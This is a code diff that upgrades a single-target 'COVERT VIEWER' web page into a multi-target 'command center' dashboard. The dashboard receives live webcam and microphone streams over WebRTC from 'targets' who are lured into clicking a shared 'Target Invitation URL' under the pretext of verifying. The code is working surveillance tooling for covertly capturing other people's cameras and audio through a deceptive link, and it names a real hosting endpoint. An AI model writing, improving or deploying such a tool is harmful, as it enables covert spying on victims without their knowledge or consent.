@@ -4,127 +4,636 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OmniLink Viewer</title>
+    <title>OmniLink Multi-Target Command Center</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --bg-base: #090d16;
+            --bg-surface: #0f172a;
+            --bg-card: #131d35;
+            --accent-cyan: #00f2fe;
+            --accent-blue: #4facfe;
+            --accent-green: #10b981;
+            --accent-red: #ef4444;
+            --accent-amber: #f59e0b;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --glow-cyan: 0 0 20px rgba(0, 242, 254, 0.25);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
         body {
-            background: #050505;
-            color: #00ffcc;
-            font-family: 'Courier New', monospace;
+            background: var(--bg-base);
+            color: var(--text-main);
+            font-family: 'Plus Jakarta Sans', -apple-system, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Header */
+        header {
+            background: rgba(15, 23, 42, 0.85);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--border-color);
+            padding: 16px 28px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 50;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .brand-icon {
+            width: 36px;
+            height: 36px;
+            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-blue));
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: var(--glow-cyan);
+        }
+
+        .brand-icon svg {
+            width: 20px;
+            height: 20px;
+            color: #050505;
+        }
+
+        .brand-title {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.15rem;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            background: linear-gradient(to right, #00f2fe, #4facfe);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .status-bar {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            font-size: 0.88rem;
+        }
+
+        .status-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 14px;
+            border-radius: 999px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border-color);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+        }
+
+        .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--accent-green);
+            box-shadow: 0 0 8px var(--accent-green);
+            animation: pulse 2s infinite;
+        }
+
+        .dot.offline {
+            background: var(--accent-red);
+            box-shadow: 0 0 8px var(--accent-red);
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.85); }
+        }
+
+        /* Main Workspace */
+        main {
+            flex: 1;
+            padding: 28px;
+            max-width: 1800px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        /* Target Link Bar */
+        .target-url-banner {
+            background: var(--bg-surface);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 14px 20px;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+
+        .target-url-label {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .url-box {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: rgba(0, 0, 0, 0.35);
+            padding: 6px 12px;
+            border-radius: 6px;
+            border: 1px solid var(--border-color);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            color: var(--accent-cyan);
+            max-width: 100%;
+            overflow-x: auto;
+        }
+
+        .btn-copy {
+            background: rgba(0, 242, 254, 0.12);
+            color: var(--accent-cyan);
+            border: 1px solid rgba(0, 242, 254, 0.3);
+            border-radius: 6px;
+            padding: 6px 14px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .btn-copy:hover {
+            background: rgba(0, 242, 254, 0.25);
+            box-shadow: var(--glow-cyan);
+        }
+
+        /* Grid Layout */
+        .targets-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(420px, 1fr));
+            gap: 24px;
+        }
+
+        /* Empty State */
+        .empty-state {
+            grid-column: 1 / -1;
+            padding: 80px 20px;
             text-align: center;
-            padding: 20px;
+            background: var(--bg-surface);
+            border: 2px dashed var(--border-color);
+            border-radius: 16px;
         }
 
-        video {
-            max-width: 80%;
-            border: 2px solid #00ffcc;
-            border-radius: 5px;
-            box-shadow: 0 0 15px #00ffcc;
-            background: black;
+        .empty-state-icon {
+            width: 64px;
+            height: 64px;
+            margin: 0 auto 16px;
+            color: var(--text-muted);
+            opacity: 0.4;
         }
 
-        h1 {
-            text-shadow: 0 0 10px #00ffcc;
+        .empty-state h3 {
+            font-size: 1.25rem;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: var(--text-main);
+        }
+
+        .empty-state p {
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            max-width: 480px;
+            margin: 0 auto;
+        }
+
+        /* Target Card */
+        .target-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 14px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+            display: flex;
+            flex-direction: column;
+            transition: transform 0.2s ease, border-color 0.2s ease;
+        }
+
+        .target-card:hover {
+            border-color: rgba(0, 242, 254, 0.35);
+            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.5), var(--glow-cyan);
+        }
+
+        .target-card-header {
+            padding: 12px 18px;
+            background: rgba(0, 0, 0, 0.25);
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+        }
+
+        .target-id {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 600;
+            color: var(--accent-cyan);
+        }
+
+        .target-status-badge {
+            font-size: 0.75rem;
+            padding: 3px 10px;
+            border-radius: 999px;
+            background: rgba(16, 185, 129, 0.15);
+            color: var(--accent-green);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+        }
+
+        .target-video-wrapper {
+            position: relative;
+            background: #000000;
+            width: 100%;
+            aspect-ratio: 16 / 9;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .target-video-wrapper video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .video-overlay-loader {
+            position: absolute;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .target-card-footer {
+            padding: 12px 18px;
+            background: rgba(0, 0, 0, 0.25);
+            border-top: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.8rem;
+            color: var(--text-muted);
+        }
+
+        .btn-action {
+            background: transparent;
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            padding: 5px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.78rem;
+            transition: all 0.2s ease;
+        }
+
+        .btn-action:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: rgba(255, 255, 255, 0.3);
+        }
+
+        @media (max-width: 768px) {
+            .targets-grid {
+                grid-template-columns: 1fr;
+            }
+            header {
+                flex-direction: column;
+                gap: 12px;
+                align-items: flex-start;
+            }
         }
     </style>
 </head>
 
 <body>
-    <h1>COVERT VIEWER</h1>
-    <p>Waiting for target to click the link...</p>
+    <header>
+        <div class="brand">
+            <div class="brand-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                    <polygon points="23 7 16 12 23 17 23 7"></polygon>
+                    <rect x="1" y="5" width="15" height="14" rx="2" ry="2"></rect>
+                </svg>
+            </div>
+            <div>
+                <div class="brand-title">OMNILINK LIVE</div>
+            </div>
+        </div>
+        <div class="status-bar">
+            <div class="status-pill">
+                <span class="dot" id="serverDot"></span>
+                <span id="serverStatusText">CONNECTING...</span>
+            </div>
+            <div class="status-pill">
+                <span>TARGETS:</span>
+                <strong id="targetCount" style="color: var(--accent-cyan);">0</strong>
+            </div>
+        </div>
+    </header>
 
-    <!-- We use a <video> tag now instead of an <img> -->
-    <video id="targetCam" autoplay playsinline style="display:none;"></video>
+    <main>
+        <div class="target-url-banner">
+            <div>
+                <span class="target-url-label">TARGET INVITATION URL:</span>
+                <div class="url-box" id="targetUrlDisplay">Loading...</div>
+            </div>
+            <button class="btn-copy" onclick="copyTargetLink()">Copy Target Link</button>
+        </div>
+
+        <div class="targets-grid" id="targetsGrid">
+            <div class="empty-state" id="emptyState">
+                <svg class="empty-state-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                    <circle cx="12" cy="12" r="10"></circle>
+                    <line x1="12" y1="8" x2="12" y2="12"></line>
+                    <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                </svg>
+                <h3>No Active Targets</h3>
+                <p>Share the target link with remote users. When they click to verify, their live stream will appear here in real time.</p>
+            </div>
+        </div>
+    </main>
 
     <script>
         const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
-        const host = "hangon-k31m.onrender.com";
-
+        const host = window.location.host || "hangon-k31m.onrender.com";
         const wsUrl = `${protocol}//${host}/ws/controller`;
 
+        // Update target URL display
+        const targetFullUrl = `${window.location.protocol}//${host}/target`;
+        document.getElementById('targetUrlDisplay').innerText = targetFullUrl;
+
+        function copyTargetLink() {
+            navigator.clipboard.writeText(targetFullUrl).then(() => {
+                const btn = document.querySelector('.btn-copy');
+                const orig = btn.innerText;
+                btn.innerText = "Copied!";
+                setTimeout(() => btn.innerText = orig, 2000);
+            });
+        }
+
+        // WebRTC Config with low-latency candidate pooling & geo-distributed STUN
         const rtcConfig = {
             iceServers: [
+                { urls: "stun:stun.cloudflare.com:3478" },
                 { urls: "stun:stun.l.google.com:19302" },
-                { urls: "stun:stun1.l.google.com:19302" }
-            ]
+                { urls: "stun:stun1.l.google.com:19302" },
+                { urls: "stun:stun2.l.google.com:19302" },
+                { urls: "stun:stun3.l.google.com:19302" },
+                { urls: "stun:stun4.l.google.com:19302" }
+            ],
+            bundlePolicy: "max-bundle",
+            rtcpMuxPolicy: "require",
+            iceCandidatePoolSize: 10
         };
 
         let ws;
-        let pc;
+        // Map of targetId -> { pc, pendingIce: [], cardEl, videoEl }
+        const targets = new Map();
+
+        function updateTargetCount() {
+            document.getElementById('targetCount').innerText = targets.size;
+            const emptyState = document.getElementById('emptyState');
+            if (targets.size === 0) {
+                emptyState.style.display = 'block';
+            } else {
+                emptyState.style.display = 'none';
+            }
+        }
 
         function connectWebSocket() {
+            const serverDot = document.getElementById('serverDot');
+            const serverStatusText = document.getElementById('serverStatusText');
+
             ws = new WebSocket(wsUrl);
 
             ws.onopen = () => {
-                console.log("Viewer connected to " + wsUrl);
-                initOffer();
+                console.log("[+] Controller connected to signaling server");
+                serverDot.classList.remove('offline');
+                serverStatusText.innerText = "ONLINE";
             };
 
             ws.onmessage = async (event) => {
                 try {
                     const msg = JSON.parse(event.data);
-                    if (msg.type === "answer" && pc) {
-                        await pc.setRemoteDescription(new RTCSessionDescription(msg.data));
-                    } else if (msg.type === "ice" && pc) {
-                        await pc.addIceCandidate(new RTCIceCandidate(msg.data));
+                    
+                    if (msg.type === "active_targets") {
+                        // Initialize connections for all currently active targets
+                        msg.targets.forEach(targetId => {
+                            if (!targets.has(targetId)) {
+                                createTargetSession(targetId);
+                            }
+                        });
+                    } else if (msg.type === "target_joined") {
+                        console.log("[+] New target joined:", msg.targetId);
+                        createTargetSession(msg.targetId);
+                    } else if (msg.type === "target_left") {
+                        console.log("[-] Target left:", msg.targetId);
+                        removeTargetSession(msg.targetId);
+                    } else if (msg.type === "answer" && msg.targetId) {
+                        const targetSession = targets.get(msg.targetId);
+                        if (targetSession && targetSession.pc) {
+                            console.log("[+] Received answer for", msg.targetId);
+                            await targetSession.pc.setRemoteDescription(new RTCSessionDescription(msg.data));
+                            
+                            // Flush pending ICE candidates
+                            while (targetSession.pendingIce.length > 0) {
+                                const cand = targetSession.pendingIce.shift();
+                                await targetSession.pc.addIceCandidate(new RTCIceCandidate(cand));
+                            }
+                        }
+                    } else if (msg.type === "ice" && msg.targetId) {
+                        const targetSession = targets.get(msg.targetId);
+                        if (targetSession && targetSession.pc) {
+                            if (targetSession.pc.remoteDescription && targetSession.pc.remoteDescription.type) {
+                                await targetSession.pc.addIceCandidate(new RTCIceCandidate(msg.data));
+                            } else {
+                                targetSession.pendingIce.push(msg.data);
+                            }
+                        }
                     }
                 } catch (e) {
-                    console.error("Error processing message:", e);
+                    console.error("Error processing controller message:", e);
                 }
             };
 
-            ws.onerror = (err) => console.error("WebSocket error:", err);
+            ws.onerror = (err) => {
+                console.error("Signaling socket error:", err);
+                serverDot.classList.add('offline');
+                serverStatusText.innerText = "ERROR";
+            };
+
             ws.onclose = () => {
-                console.log("WebSocket closed. Reconnecting in 2s...");
-                setTimeout(connectWebSocket, 2000);
+                console.log("Signaling closed. Reconnecting in 1.5s...");
+                serverDot.classList.add('offline');
+                serverStatusText.innerText = "RECONNECTING";
+                setTimeout(connectWebSocket, 1500);
             };
         }
 
-        connectWebSocket();
+        async function createTargetSession(targetId) {
+            if (targets.has(targetId)) return;
 
-        // Retry connection handshake if target reconnects or connection drops
-        setInterval(() => {
-            if (ws && ws.readyState === WebSocket.OPEN) {
-                if (!pc || pc.connectionState === "failed" || pc.connectionState === "disconnected") {
-                    initOffer();
+            // Create UI Card
+            const grid = document.getElementById('targetsGrid');
+            const card = document.createElement('div');
+            card.className = 'target-card';
+            card.id = `card-${targetId}`;
+            card.innerHTML = `
+                <div class="target-card-header">
+                    <div class="target-id">
+                        <span class="dot"></span>
+                        TARGET [${targetId}]
+                    </div>
+                    <span class="target-status-badge" id="badge-${targetId}">CONNECTING</span>
+                </div>
+                <div class="target-video-wrapper">
+                    <video id="video-${targetId}" autoplay playsinline></video>
+                    <div class="video-overlay-loader" id="loader-${targetId}">
+                        <div class="dot" style="animation-duration: 0.8s;"></div>
+                        <span>Negotiating Fast Stream...</span>
+                    </div>
+                </div>
+                <div class="target-card-footer">
+                    <span id="time-${targetId}">Connected just now</span>
+                    <div style="display: flex; gap: 8px;">
+                        <button class="btn-action" onclick="toggleMute('${targetId}')">Mute / Unmute</button>
+                        <button class="btn-action" onclick="fullscreenVideo('${targetId}')">Fullscreen</button>
+                    </div>
+                </div>
+            `;
+            grid.appendChild(card);
+
+            const videoEl = card.querySelector(`#video-${targetId}`);
+            const loaderEl = card.querySelector(`#loader-${targetId}`);
+            const badgeEl = card.querySelector(`#badge-${targetId}`);
+
+            const pc = new RTCPeerConnection(rtcConfig);
+            const targetSession = {
+                pc,
+                pendingIce: [],
+                cardEl: card,
+                videoEl,
+                loaderEl,
+                badgeEl
+            };
+            targets.set(targetId, targetSession);
+            updateTargetCount();
+
+            // Set recvonly transceivers
+            pc.addTransceiver('video', { direction: 'recvonly' });
+            pc.addTransceiver('audio', { direction: 'recvonly' });
+
+            pc.ontrack = (event) => {
+                if (event.streams && event.streams[0]) {
+                    videoEl.srcObject = event.streams[0];
+                    loaderEl.style.display = 'none';
+                    badgeEl.innerText = 'LIVE STREAMING';
+                    badgeEl.style.color = '#10b981';
+                    console.log(`[+] Stream attached for target: ${targetId}`);
                 }
-            }
-        }, 4000);
+            };
 
-        async function initOffer() {
+            pc.onicecandidate = (event) => {
+                if (event.candidate && ws && ws.readyState === WebSocket.OPEN) {
+                    ws.send(JSON.stringify({
+                        targetId,
+                        type: "ice",
+                        data: event.candidate
+                    }));
+                }
+            };
+
+            pc.onconnectionstatechange = () => {
+                console.log(`[*] Target ${targetId} connection state:`, pc.connectionState);
+                if (pc.connectionState === "connected") {
+                    loaderEl.style.display = 'none';
+                    badgeEl.innerText = 'LIVE STREAMING';
+                } else if (pc.connectionState === "failed" || pc.connectionState === "disconnected") {
+                    badgeEl.innerText = 'OFFLINE';
+                    badgeEl.style.color = '#ef4444';
+                }
+            };
+
             try {
-                if (pc) {
-                    pc.close();
-                }
-                pc = new RTCPeerConnection(rtcConfig);
-
-                pc.addTransceiver('audio', { direction: 'recvonly' });
-                pc.addTransceiver('video', { direction: 'recvonly' });
-
-                pc.ontrack = (event) => {
-                    const video = document.getElementById('targetCam');
-                    if (event.streams && event.streams[0]) {
-                        video.srcObject = event.streams[0];
-                        video.style.display = 'inline-block';
-                        console.log("Stream received!");
-                    }
-                };
-
-                pc.onicecandidate = (event) => {
-                    if (event.candidate && ws && ws.readyState === WebSocket.OPEN) {
-                        ws.send(JSON.stringify({ "type": "ice", "data": event.candidate }));
-                    }
-                };
-
                 const offer = await pc.createOffer();
                 await pc.setLocalDescription(offer);
 
                 if (ws && ws.readyState === WebSocket.OPEN) {
-                    ws.send(JSON.stringify({ "type": "offer", "data": offer }));
+                    console.log(`[+] Dispatched instant offer to target ${targetId}`);
+                    ws.send(JSON.stringify({
+                        targetId,
+                        type: "offer",
+                        data: offer
+                    }));
                 }
             } catch (err) {
-                console.error("Error creating offer:", err);
+                console.error(`Error creating offer for ${targetId}:`, err);
             }
         }
+
+        function removeTargetSession(targetId) {
+            const session = targets.get(targetId);
+            if (!session) return;
+
+            try { session.pc.close(); } catch (e) {}
+            if (session.cardEl && session.cardEl.parentNode) {
+                session.cardEl.remove();
+            }
+            targets.delete(targetId);
+            updateTargetCount();
+        }
+
+        function toggleMute(targetId) {
+            const video = document.getElementById(`video-${targetId}`);
+            if (video) {
+                video.muted = !video.muted;
+            }
+        }
+
+        function fullscreenVideo(targetId) {
+            const video = document.getElementById(`video-${targetId}`);
+            if (video) {
+                if (video.requestFullscreen) video.requestFullscreen();
+                else if (video.webkitRequestFullscreen) video.webkitRequestFullscreen();
+            }
+        }
+
+        // Start connection
+        connectWebSocket();
     </script>
 </body>
 
